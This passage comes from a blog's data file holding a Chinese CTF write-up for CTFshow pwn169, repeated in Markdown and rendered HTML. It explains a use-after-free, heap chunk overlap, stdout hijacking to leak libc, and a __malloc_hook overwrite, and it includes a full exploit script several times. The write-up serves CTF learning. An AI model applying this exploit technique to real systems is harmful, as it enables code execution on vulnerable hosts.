 add(0x60,5,b'f')  # 5\n    free(1)\n\n    edit(5,p64(0)*9+p64(0x91))\n    free(1)\n    edit(5,p64(0)*9+p64(0x71))\n    edit(1,b'\\xdd\\x55')\n    payload=b'\\0'*0x33+p64(0xfbad1887)+p64(0)*3+b'\\0'\n    add(0x60,6,b'a')\n    add(0x60,7,payload)\n\n    # leak - libc\n    io.recv(0x40)\n    stdout=u64(io.recv(6).ljust(8,b'\\x00'))+0x20\n    libcbase=stdout-libc.sym['_IO_2_1_stdout_']\n    malloc_hook=libcbase+libc.sym['__malloc_hook']\n    realloc=libcbase+libc.sym['realloc']\n    one_gadget=[0x4526a,0xf02a4]\n    logvalue(\"stdout\",hex(stdout))\n    # \n    free(1)\n    edit(1,p64(malloc_hook-0x23))\n    payload=0xb*b\"\\x00\"+p64(one_gadget[0]+libcbase)+p64(realloc+4)\n    add(0x60,1,b'a')\n    add(0x60,8,payload)\n    io.sendlineafter(\"choice >>\",\"1\")\n    io.sendlineafter(\"wlecome input your size of skills: \",str(0x20))\n    io.sendlineafter(\"input index: \",str(1))\n\nwhile True:\n    try:\n        io,elf=loadfile(\"pwn\",\"pwn.challenge.ctf.show\",28175)\n        exploit()\n        io.interactive()\n    except:\n        io.close()\n```","source":"_posts/heap/CTFshow pwn169.md","raw":"---\ntitle: CTFshow pwn169\ntags:\n    - pwn\n    - IO_FILE\ncategories:\n    - 做题笔记\ncover: /img/治不开心药.png\n---\n# CTFshow pwn169(重叠|劫持stdout)\n## 前言\n\n​\t堆块重叠，真的是绕不开的一个手法。只要有uaf漏洞几乎都需要重叠来配合。这一道是比较简单的一道题，自己拖拖拉拉，又捱到了22点才完成这到题。对stdout已经完全不陌生了，感觉像老朋友了。这到题也算又扩展（应该算复习）了堆块重叠的一种方法。\n​\t如果说uaf漏洞是在借尸还魂，那么我们重叠的手法就是**“瞒天过海”**\n\n## ida分析\n### main函数分析\n![image-20250611230847917](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230847917.png)\n1.一个menu，三个功能\n2.没有show，应该是需要劫持stdout来泄露libc的\n\n### create函数分析\n![image-20250611230931371](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230931371.png)\n1.限制了大小，大小合适才能malloc\n2.96是0x60，加上chunk头，最大是0x70，这个大小还不够进入unsorted bin\n\n### delete函数分析\n![](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231214680.png)\n1.明显的uaf漏洞\n\n### rename函数分析\n![image-20250611231354251](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231354251.png)\n1.没有漏洞只能正常的编辑堆块内容\n\n## 思路分析\n1.在保护机制全开的情况下，没有show功能的时候，第一想到的就是劫持stdout。常见做法就是打overlap，让堆块既在fastbins又在unsorted bin中。因为unsorted bin中的堆块会被写入main_arena相关地址，借此覆盖低位就可以劫持的stdout。但是这题限制了堆块大小，我们该如何把堆块放入unsorted bin中呢？\n2.利用堆块的重叠，去构造一个大小可以进入unsorted bin中的堆块。其实堆块重叠的本质是修改堆块的size，使其修改后的大小可以包含相邻的其他堆块(刚好重叠)。在这道题中我们没有溢出漏洞去修改size，所以不能直接完成这个利用。但是我们可以在堆块内，构造一个fake chunk 的chunk 头 ，然后通过fastbins 的fd 链表，覆盖低地址，把fake chunk 链入链表中。然后分配出这个堆块，因为堆块的重叠，物理地址相邻的下一个堆块的chunk 头就在我们可编辑的范围内了。然后就可以修改其size，把其放入unsorted bin中。同时，为了可以分配到stdout，我们需要提前把这个unsorted bin的堆块放入fastbins 中，通过fastbin dup 去劫持。\n3.泄露出libc后呢，就是劫持malloc_hook和realloc。也是很常规的操作了。\n\n\n## exp\n```python \nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=[\"tmux\",\"splitw\",\"-h\",\"-l\",\"66%\"]\n\nlibc=ELF(\"/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6\")\n\ndef add(size,idx,content):\n    io.sendlineafter(\"choice >>\",\"1\")\n    io.sendlineafter(\"wlecome input your size of skills: \",str(size))\n    io.sendlineafter(\"input index: \",str(idx))\n    io.sendafter(\"input your name:\\n\",content)\n\ndef free(idx):\n    io.sendlineafter(\"choice >>\",\"2\")\n    io.sendlineafter(\"input idx :\",str(idx))\n\ndef edit(idx,content):\n    io.sendlineafter(\"choice >>\",\"3\")\n    io.sendlineafter(\"input idx: \",str(idx))\n    io.sendafter(\"new content:\",content)\n\n\ndef exploit():\n    fake=p64(0)+p64(0x71)\n    add(0x60,0,b'\\x63'*0x10+fake) # 0\n    add(0x60,1,b'\\x61'*4) # 1 .....\n    add(0x10,2,b'\\x62'*4) # 2\n    add(0x60,3,b'\\x64'*4) # 3\n    add(0x20,4,b'\\x64'*4) # 4\n    free(1)\n    free(0)\n\n    edit(0,b'\\x20')\n    add(0x60,0,b'a')   # 0\n    add(0x60,5,b'f')  # 5\n    free(1)\n\n    edit(5,p64(0)*9+p64(0x91))\n    free(1)\n    edit(5,p64(0)*9+p64(0x71))\n    edit(1,b'\\xdd\\x55')\n    payload=b'\\0'*0x33+p64(0xfbad1887)+p64(0)*3+b'\\0'\n    add(0x60,6,b'a')\n    add(0x60,7,payload)\n\n    # leak - libc\n    io.recv(0x40)\n    stdout=u64(io.recv(6).ljust(8,b'\\x00'))+0x20\n    libcbase=stdout-libc.sym['_IO_2_1_stdout_']\n    malloc_hook=libcbase+libc.sym['__malloc_hook']\n    realloc=libcbase+libc.sym['realloc']\n    one_gadget=[0x4526a,0xf02a4]\n    logvalue(\"stdout\",hex(stdout))\n    # \n    free(1)\n    edit(1,p64(malloc_hook-0x23))\n    payload=0xb*b\"\\x00\"+p64(one_gadget[0]+libcbase)+p64(realloc+4)\n    add(0x60,1,b'a')\n    add(0x60,8,payload)\n    io.sendlineafter(\"choice >>\",\"1\")\n    io.sendlineafter(\"wlecome input your size of skills: \",str(0x20))\n    io.sendlineafter(\"input index: \",str(1))\n\nwhile True:\n    try:\n        io,elf=loadfile(\"pwn\",\"pwn.challenge.ctf.show\",28175)\n        exploit()\n        io.interactive()\n    except:\n        io.close()\n```","slug":"heap/CTFshow pwn169","published":1,"date":"2025-06-22T12:08:58.260Z","updated":"2025-08-07T06:16:51.620Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2id001nuomydt2df3p1","content":"<h1 id=\"CTFshow-pwn169-重叠-劫持stdout\"><a href=\"#CTFshow-pwn169-重叠-劫持stdout\" class=\"headerlink\" title=\"CTFshow pwn169(重叠|劫持stdout)\"></a>CTFshow pwn169(重叠|劫持stdout)</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​\t堆块重叠，真的是绕不开的一个手法。只要有uaf漏洞几乎都需要重叠来配合。这一道是比较简单的一道题，自己拖拖拉拉，又捱到了22点才完成这到题。对stdout已经完全不陌生了，感觉像老朋友了。这到题也算又扩展（应该算复习）了堆块重叠的一种方法。<br>​\t如果说uaf漏洞是在借尸还魂，那么我们重叠的手法就是<strong>“瞒天过海”</strong></p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230847917.png\" alt=\"image-20250611230847917\"><br>1.一个menu，三个功能<br>2.没有show，应该是需要劫持stdout来泄露libc的</p>\n<h3 id=\"create函数分析\"><a href=\"#create函数分析\" class=\"headerlink\" title=\"create函数分析\"></a>create函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230931371.png\" alt=\"image-20250611230931371\"><br>1.限制了大小，大小合适才能malloc<br>2.96是0x60，加上chunk头，最大是0x70，这个大小还不够进入unsorted bin</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231214680.png\"><br>1.明显的uaf漏洞</p>\n<h3 id=\"rename函数分析\"><a href=\"#rename函数分析\" class=\"headerlink\" title=\"rename函数分析\"></a>rename函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231354251.png\" alt=\"image-20250611231354251\"><br>1.没有漏洞只能正常的编辑堆块内容</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><p>1.在保护机制全开的情况下，没有show功能的时候，第一想到的就是劫持stdout。常见做法就是打overlap，让堆块既在fastbins又在unsorted bin中。因为unsorted bin中的堆块会被写入main_arena相关地址，借此覆盖低位就可以劫持的stdout。但是这题限制了堆块大小，我们该如何把堆块放入unsorted bin中呢？<br>2.利用堆块的重叠，去构造一个大小可以进入unsorted bin中的堆块。其实堆块重叠的本质是修改堆块的size，使其修改后的大小可以包含相邻的其他堆块(刚好重叠)。在这道题中我们没有溢出漏洞去修改size，所以不能直接完成这个利用。但是我们可以在堆块内，构造一个fake chunk 的chunk 头 ，然后通过fastbins 的fd 链表，覆盖低地址，把fake chunk 链入链表中。然后分配出这个堆块，因为堆块的重叠，物理地址相邻的下一个堆块的chunk 头就在我们可编辑的范围内了。然后就可以修改其size，把其放入unsorted bin中。同时，为了可以分配到stdout，我们需要提前把这个unsorted bin的堆块放入fastbins 中，通过fastbin dup 去劫持。<br>3.泄露出libc后呢，就是劫持malloc_hook和realloc。也是很常规的操作了。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&quot;tmux&quot;</span>,<span class=\"string\">&quot;splitw&quot;</span>,<span class=\"string\">&quot;-h&quot;</span>,<span class=\"string\">&quot;-l&quot;</span>,<span class=\"string\">&quot;66%&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,idx,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;wlecome input your size of skills: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;input index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;input your name:\\n&quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;input idx :&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;input idx: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;new content:&quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit</span>():</span><br><span class=\"line\">    fake=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x71</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">0</span>,<span class=\"string\">b&#x27;\\x63&#x27;</span>*<span class=\"number\">0x10</span>+fake) <span class=\"comment\"># 0</span></span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">1</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>*<span class=\"number\">4</span>) <span class=\"comment\"># 1 .....</span></span><br><span class=\"line\">    add(<span class=\"number\">0x10</span>,<span class=\"number\">2</span>,<span class=\"string\">b&#x27;\\x62&#x27;</span>*<span class=\"number\">4</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">3</span>,<span class=\"string\">b&#x27;\\x64&#x27;</span>*<span class=\"number\">4</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>,<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x64&#x27;</span>*<span class=\"number\">4</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;\\x20&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>)   <span class=\"comment\"># 0</span></span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">5</span>,<span class=\"string\">b&#x27;f&#x27;</span>)  <span class=\"comment\"># 5</span></span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    edit(<span class=\"number\">5</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">9</span>+p64(<span class=\"number\">0x91</span>))</span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    edit(<span class=\"number\">5</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">9</span>+p64(<span class=\"number\">0x71</span>))</span><br><span class=\"line\">    edit(<span class=\"number\">1</span>,<span class=\"string\">b&#x27;\\xdd\\x55&#x27;</span>)</span><br><span class=\"line\">    payload=<span class=\"string\">b&#x27;\\0&#x27;</span>*<span class=\"number\">0x33</span>+p64(<span class=\"number\">0xfbad1887</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+<span class=\"string\">b&#x27;\\0&#x27;</span></span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">6</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">7</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># leak - libc</span></span><br><span class=\"line\">    io.recv(<span class=\"number\">0x40</span>)</span><br><span class=\"line\">    stdout=u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))+<span class=\"number\">0x20</span></span><br><span class=\"line\">    libcbase=stdout-libc.sym[<span class=\"string\">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class=\"line\">    malloc_hook=libcbase+libc.sym[<span class=\"string\">&#x27;__malloc_hook&#x27;</span>]</span><br><span class=\"line\">    realloc=libcbase+libc.sym[<span class=\"string\">&#x27;realloc&#x27;</span>]</span><br><span class=\"line\">    one_gadget=[<span class=\"number\">0x4526a</span>,<span class=\"number\">0xf02a4</span>]</span><br><span class=\"line\">    logvalue(<span class=\"string\">&quot;stdout&quot;</span>,<span class=\"built_in\">hex</span>(stdout))</span><br><span class=\"line\">    <span class=\"comment\"># </span></span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    edit(<span class=\"number\">1</span>,p64(malloc_hook-<span class=\"number\">0x23</span>))</span><br><span class=\"line\">    payload=<span class=\"number\">0xb</span>*<span class=\"string\">b&quot;\\x00&quot;</span>+p64(one_gadget[<span class=\"number\">0</span>]+libcbase)+p64(realloc+<span class=\"number\">4</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">1</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">8</span>,payload)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;wlecome input your size of skills: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">0x20</span>))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;input index: &quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        io,elf=loadfile(<span class=\"string\">&quot;pwn&quot;</span>,<span class=\"string\">&quot;pwn.challenge.ctf.show&quot;</span>,<span class=\"number\">28175</span>)</span><br><span class=\"line\">        exploit()</span><br><span class=\"line\">        io.interactive()</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        io.close()</span><br></pre></td></tr></table></figure>","excerpt":"","more":"<h1 id=\"CTFshow-pwn169-重叠-劫持stdout\"><a href=\"#CTFshow-pwn169-重叠-劫持stdout\" class=\"headerlink\" title=\"CTFshow pwn169(重叠|劫持stdout)\"></a>CTFshow pwn169(重叠|劫持stdout)</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​\t堆块重叠，真的是绕不开的一个手法。只要有uaf漏洞几乎都需要重叠来配合。这一道是比较简单的一道题，自己拖拖拉拉，又捱到了22点才完成这到题。对stdout已经完全不陌生了，感觉像老朋友了。这到题也算又扩展（应该算复习）了堆块重叠的一种方法。<br>​\t如果说uaf漏洞是在借尸还魂，那么我们重叠的手法就是<strong>“瞒天过海”</strong></p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数分析\"><a href=\"#main函数分析\" class=\"headerlink\" title=\"main函数分析\"></a>main函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230847917.png\" alt=\"image-20250611230847917\"><br>1.一个menu，三个功能<br>2.没有show，应该是需要劫持stdout来泄露libc的</p>\n<h3 id=\"create函数分析\"><a href=\"#create函数分析\" class=\"headerlink\" title=\"create函数分析\"></a>create函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611230931371.png\" alt=\"image-20250611230931371\"><br>1.限制了大小，大小合适才能malloc<br>2.96是0x60，加上chunk头，最大是0x70，这个大小还不够进入unsorted bin</p>\n<h3 id=\"delete函数分析\"><a href=\"#delete函数分析\" class=\"headerlink\" title=\"delete函数分析\"></a>delete函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231214680.png\"><br>1.明显的uaf漏洞</p>\n<h3 id=\"rename函数分析\"><a href=\"#rename函数分析\" class=\"headerlink\" title=\"rename函数分析\"></a>rename函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250611231354251.png\" alt=\"image-20250611231354251\"><br>1.没有漏洞只能正常的编辑堆块内容</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><p>1.在保护机制全开的情况下，没有show功能的时候，第一想到的就是劫持stdout。常见做法就是打overlap，让堆块既在fastbins又在unsorted bin中。因为unsorted bin中的堆块会被写入main_arena相关地址，借此覆盖低位就可以劫持的stdout。但是这题限制了堆块大小，我们该如何把堆块放入unsorted bin中呢？<br>2.利用堆块的重叠，去构造一个大小可以进入unsorted bin中的堆块。其实堆块重叠的本质是修改堆块的size，使其修改后的大小可以包含相邻的其他堆块(刚好重叠)。在这道题中我们没有溢出漏洞去修改size，所以不能直接完成这个利用。但是我们可以在堆块内，构造一个fake chunk 的chunk 头 ，然后通过fastbins 的fd 链表，覆盖低地址，把fake chunk 链入链表中。然后分配出这个堆块，因为堆块的重叠，物理地址相邻的下一个堆块的chunk 头就在我们可编辑的范围内了。然后就可以修改其size，把其放入unsorted bin中。同时，为了可以分配到stdout，我们需要提前把这个unsorted bin的堆块放入fastbins 中，通过fastbin dup 去劫持。<br>3.泄露出libc后呢，就是劫持malloc_hook和realloc。也是很常规的操作了。</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal=[<span class=\"string\">&quot;tmux&quot;</span>,<span class=\"string\">&quot;splitw&quot;</span>,<span class=\"string\">&quot;-h&quot;</span>,<span class=\"string\">&quot;-l&quot;</span>,<span class=\"string\">&quot;66%&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/home/tsq/glibc-all-in-one/libs/2.23_0ubuntu10_amd64/libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,idx,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;wlecome input your size of skills: &quot;</span>,<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;input index: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;input your name:\\n&quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;2&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;input idx :&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;choice &gt;&gt;&quot;</span>,<span class=\"string\">&quot;3&quot;</span>)</span><br><span class=\"line\">    io.sendlineafter(<span class=\"string\">&quot;input idx: &quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    io.sendafter(<span class=\"string\">&quot;new content:&quot;</span>,content)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">exploit</span>():</span><br><span class=\"line\">    fake=p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x71</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">0</span>,<span class=\"string\">b&#x27;\\x63&#x27;</span>*<span class=\"number\">0x10</span>+fake) <span class=\"comment\"># 0</span></span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">1</span>,<span class=\"string\">b&#x27;\\x61&#x27;</span>*<span class=\"number\">4</span>) <span class=\"comment\"># 1 .....</span></span><br><span class=\"line\">    add(<span class=\"number\">0x10</span>,<span class=\"number\">2</span>,<span class=\"string\">b&#x27;\\x62&#x27;</span>*<span class=\"number\">4</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">3</span>,<span class=\"string\">b&#x27;\\x64&#x27;</span>*<span class=\"number\">4</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\">    add(<span class=\"number\">0x20</span>,<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x64&#x27;</span>*<span class=\"number\">4</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    edit(<span class=\"number\">0</span>,<span class=\"string\">b&#x27;\\x20&#x27;</span>)</span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">0</span>,<span class=\"string\">b&#x27;a&#x27;</span>)   <span class=\"comment\"># 0</span></span><br><span class=\"line\">    add(<span class=\"number\">0x60</span>,<span class=\"number\">5</span>,<span class=\"string\">b&#x27;f&#x27;</span>)  <span class=\"comment\"># 5</span></span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    edit(<span class=\"number\">5</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">9</span>+p64(<span class=\"number\">0x91</span>))</span><br><span class=\"line\">    free(<span class=\"number\">1</span>)</span><br><span class=\"line\">    edit(<span class=\"number\">5</span>,p64(<span 